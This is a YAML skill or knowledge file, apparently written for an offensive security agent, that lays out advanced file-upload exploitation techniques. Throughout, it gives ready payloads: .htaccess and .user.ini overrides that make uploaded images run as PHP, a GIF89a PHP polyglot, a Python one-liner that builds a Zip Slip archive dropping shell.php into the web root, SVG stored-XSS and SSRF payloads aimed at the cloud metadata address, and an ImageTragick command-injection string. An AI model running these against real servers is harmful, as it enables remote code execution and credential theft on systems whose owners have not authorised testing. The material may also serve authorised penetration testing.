schema_version: 1
version: 3.0.0
name: file-upload-advanced
description: >
  Advanced file upload exploitation — binary polyglots (GIF/JPEG/PDF), archive extraction path
  traversal (Zip Slip), web server configuration overwrites (.htaccess, .user.ini), ImageMagick/Ghostscript
  delegate injection, and SVG-based stored XSS/SSRF.
triggers:
  - zip slip
  - polyglot upload
  - .htaccess upload
  - .user.ini upload
  - imagetragick
  - svg xss upload
  - archive extraction
  - magic byte polyglot
tools:
  - curl
  - python3
knowledge: |
  Advanced file upload exploitation leverages parser discrepancies, archive decompression vulnerabilities,
  and binary image delegates to achieve arbitrary code execution when direct script uploads are blocked.

  1. SERVER CONFIGURATION INJECTION (.HTACCESS & .USER.INI):
     When direct execution of PHP files is disabled in the upload directory:
     a. Apache .htaccess Handler Overwrite:
        Upload a file named '.htaccess' containing:
          AddType application/x-httpd-php .png
        Then upload 'image.png' containing PHP code; Apache will parse image.png with the PHP engine!
     b. PHP-FPM / Nginx .user.ini Prepend:
        Upload '.user.ini' containing:
          auto_prepend_file=avatar.jpg
        Every PHP script executed in that directory will automatically load and run avatar.jpg first.

  2. BINARY MAGIC-BYTE POLYGLOTS:
     When server-side libraries (libmagic, getimagesize(), exif_read_data()) validate file headers:
     - GIF89a Polyglot:
       Prepend `GIF89a;` followed by script payload:
         `GIF89a;<?php phpinfo(); ?>`
     - JPEG EXIF Comment Injection:
       Use Python to inject code into the JPEG COM (Comment) segment (hex marker FF FE)
       without corrupting the SOF (Start of Frame) and SOS (Start of Scan) markers:
         Valid image renders in gallery, but executes if passed to an include() sink.

  3. ZIP SLIP (ARCHIVE EXTRACTION PATH TRAVERSAL):
     When the application accepts .zip, .tar, or .gz files and decompresses them:
     Craft an archive with directory traversal in its internal file records:
       python3 -c "
       import zipfile
       z = zipfile.ZipFile('exploit.zip', 'w')
       z.writestr('../../var/www/html/shell.php', '<?php echo \"ZIPSLIP_OK\"; ?>')
       z.close()
       "
     If the extraction utility lacks canonical path validation (`path.normalize()`), the file drops
     directly into the web root or replaces existing system configuration files.

  4. SVG VECTORS (STORED XSS, SSRF, & XXE):
     When SVG vector graphics are accepted:
     a. Stored XSS:
        `<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>`
        If served inline with `image/svg+xml` without `Content-Disposition: attachment`, executes script.
     b. External Entity / SSRF:
        `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">`
        `<image xlink:href="http://169.254.169.254/latest/meta-data/" height="100" width="100"/>`
        `</svg>`

  5. IMAGEMAGICK / GHOSTSCRIPT DELEGATE EXPLOITATION:
     When the backend invokes image conversion utilities (convert, identify):
     Test Magick Vector Graphics (MVG) command execution:
       `push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://example.com/img.jpg"|id")'\npop graphic-context`
